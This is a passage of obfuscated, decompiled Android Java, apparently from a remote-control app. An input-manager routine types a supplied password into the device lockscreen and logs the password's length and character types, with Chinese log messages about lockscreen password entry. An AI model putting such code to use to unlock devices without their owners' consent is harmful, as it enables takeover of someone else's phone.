                    if (m210548b5(str)) {
                        da0 da0Var = this.f45726a4;
                        if (da0Var != null) {
                            da0Var.m212577a4("text");
                        }
                        Thread.sleep(150L);
                        return;
                    }
                    da0 da0Var2 = this.f45726a4;
                    if (da0Var2 != null) {
                        da0Var2.m212577a4("standard");
                    }
                    z50Var.m215367a3(str);
                    Thread.sleep(150L);
                    return;
                }
                Pair pair = new Pair("length", Integer.valueOf(str.length()));
                int i4 = 0;
                while (true) {
                    if (i4 >= str.length()) {
                        z = false;
                        break;
                    } else {
                        if (Character.isDigit(str.charAt(i4))) {
                            z = true;
                            break;
                        }
                        i4++;
                    }
                }
                Pair pair2 = new Pair("hasDigits", Boolean.valueOf(z));
                int i5 = 0;
                while (true) {
                    if (i5 >= str.length()) {
                        z2 = false;
                        break;
                    } else {
                        if (Character.isLetter(str.charAt(i5))) {
                            z2 = true;
                            break;
                        }
                        i5++;
                    }
                }
                AbstractC0770a1.m213614f9(pair, pair2, new Pair("hasLetters", Boolean.valueOf(z2)), new Pair("inputMethod", "mixed_lockscreen_input"), new Pair("webUnlockMode", Boolean.FALSE));
                dqtvuisjd.m211435k0("MIXED_PASSWORD_INPUT", "混合密码输入开始");
                da0 da0Var3 = this.f45726a4;
                if (da0Var3 != null) {
                    da0Var3.m212577a4("mixed");
                }
                try {
                    try {
                        z50Var.m215367a3(str);
                        Thread.sleep(500L);
                        if (m210544a8()) {
                            m210553b0();
                        }
                    } catch (Exception e2) {
                        t60.m214705c6("InputManager", "混合密码锁屏输入失败", e2);
                    }
                } catch (Exception e3) {
                    t60.m214705c6("InputManager", "统一文本输入失败", e3);
                }
                Thread.sleep(200L);
                return;
            }
        }
        m210551a6(str);
    }
}
